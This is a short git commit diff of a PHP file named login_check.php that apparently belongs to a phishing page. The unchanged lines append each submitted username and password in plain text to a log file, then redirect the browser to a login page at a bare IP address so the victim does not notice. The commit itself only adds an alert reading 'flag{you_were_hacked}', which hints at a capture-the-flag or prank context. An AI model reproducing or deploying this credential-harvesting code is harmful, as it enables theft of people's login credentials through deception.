57845cf4af8aa0c5c0f65c9cc01650725c129a7a
♫果果™ <41176575+gwyxjtu@users.noreply.github.com>
2019-08-22 12:38:43 +0800

    Update login_check.php

--- files/login_check.php
+++ files/login_check.php
@@ -7,7 +7,7 @@ $log = fopen("save/0w1_lalala.txt", "a");
 fwrite($log, $username ."  ".$password. "\r\n");
 fclose($log);
 
-
+echo "<script>alert('flag{you_were_hacked}')</script>";
 echo '<script language="javascript">';
 echo "location.href='http://106.13.95.208/login'";
 echo '</script>';
